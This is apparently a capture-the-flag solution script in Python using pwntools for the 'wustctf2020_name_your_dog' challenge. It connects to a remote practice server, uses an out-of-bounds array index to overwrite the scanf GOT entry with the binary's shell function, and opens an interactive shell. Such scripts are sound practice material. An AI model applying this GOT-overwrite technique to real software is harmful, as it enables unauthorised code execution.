from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('wustctf2020_name_your_dog')
io = remote('node4.buuoj.cn', 27516)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.27.so')
elf = ELF('wustctf2020_name_your_dog')
shell = elf.sym['shell']
Dogs = elf.sym['Dogs']
__isoc99_scanf_got = elf.got['__isoc99_scanf']

index = (__isoc99_scanf_got - Dogs) // 8
io.sendlineafter('Name for which?\n>', str(index))
io.sendlineafter('Give your name plz: ', p32(shell))
io.interactive()
